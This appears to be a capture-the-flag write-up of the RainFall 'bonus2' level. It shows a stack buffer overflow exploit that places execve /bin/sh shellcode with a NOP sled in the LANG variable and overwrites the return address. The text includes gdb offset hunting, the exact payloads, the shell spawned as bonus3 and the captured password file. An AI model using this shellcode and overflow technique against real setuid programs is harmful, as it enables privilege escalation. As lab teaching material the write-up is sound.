# Bonus2

We can find an executable waiting for two inputs and print them by separating them with a space :
```
bonus2@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus3 users 5664 Mar  6  2016 bonus2
bonus2@RainFall:~$ ./bonus2 
bonus2@RainFall:~$ ./bonus2 bla
bonus2@RainFall:~$ ./bonus2 bla bla
Hello bla
bonus2@RainFall:~$
```
After analyze it with gdb we can find two interesting functions : `main()` and `greetuser()`.  
Please refer to file [asm_analysis.md](https://github.com/maxisimo/42-RainFall/blob/main/bonus2/Ressources/asm_analysis.md) in parallel of [source.c](https://github.com/maxisimo/42-RainFall/blob/main/bonus2/source.c) for more details.  
So we enter 2 arguments to the program. Then it copies at most 40 bytes of argv[1] in a buffer, and at most 32 bytes of argv[2] in the same buffer at index 40 (so after argv[1]).  
WE can see that the program also checks the LANG env variable and sets a global variable to either 1 if LANG is equal to 'fi' or 2 if LANG is equal to 'nl'.  
Then in greetuser it copies a message (different length depending on the language) in a 64 bytes buffer. And then concatenate to it, our string given as parameter.  
Let's try to get the offset of `eip` with the differents possibles values of LANG with the pattern generator :  
- LANG!=fi && LANG!=nl
```
(gdb) run $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x08006241 in ?? ()              // offset : ??
```
If we don't set LANG, our global variable is equal to 0. Then, the concatenation of  "Hello " and our string given as parameter is made on our buffer but it's not long enought to overwrite `eip`.  
- LANG=fi
```
bonus2@RainFall:~$ export LANG=fi
bonus2@RainFall:~$ gdb bonus2
(gdb) run $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x41366141 in ?? ()              // offset : 18
```
- LANG=nl
```
bonus2@RainFall:~$ export LANG=nl
bonus2@RainFall:~$ gdb bonus2
(gdb) run $(python -c 'print "A" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x38614137 in ?? ()              // offset : 23
```
If LANG is either 'fi' or 'nl' and the parameter passed to `greetuser()` is long enough, we can overwrite the return address (`eip`) !  
<br />
<hr />

Lets's build our exploit:
- First, we'll need a [shellcode](http://shell-storm.org/shellcode/files/shellcode-575.php) :  
	"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
- Second, put our shellcode in env variable LANG :  
	export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')  
	*Of course you can tape "nl" or "fi"*  
- Then, create templates for our args :  
	argv[1] : padding (40 bytes)  
	argv[2] : padding (18 or 23 bytes depends of LANG) + address inside `NOP` instructions (4 bytes)
- Determine the address inside `NOP` instructions :  
	Find the start address of LANG with gdb :
	- b *main+125
	- run $(python -c 'print "A"*40') bla
	- x/20s *((char**)environ)  
	Then add random value to reach an address inside `NOP` instructions  

LANG=nl
```
bonus2@RainFall:~$ export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
(gdb) b *main+125
(gdb) run $(python -c 'print "A"*40') bla
(gdb) x/20s *((char**)environ)
0xbffffeb4 + 50 (random value) = 0xbffffee6
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\xe6\xfe\xff\xbf"')
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
$ exit
bonus2@RainFall:~$
```
LANG=fi
```
bonus2@RainFall:~$ export LANG=$(python -c 'print("nl" + "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
(gdb) b *main+125
(gdb) run $(python -c 'print "A"*40') bla
(gdb) x/20s *((char**)environ)
0xbffffeb4 + 50 (random value) = 0xbffffee6
bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\xe6\xfe\xff\xbf"')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
$ exit
bonus2@RainFall:~$ su bonus3
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /home/user/bonus3/bonus3
bonus3@RainFall:~$
```
Bonus2 passed!
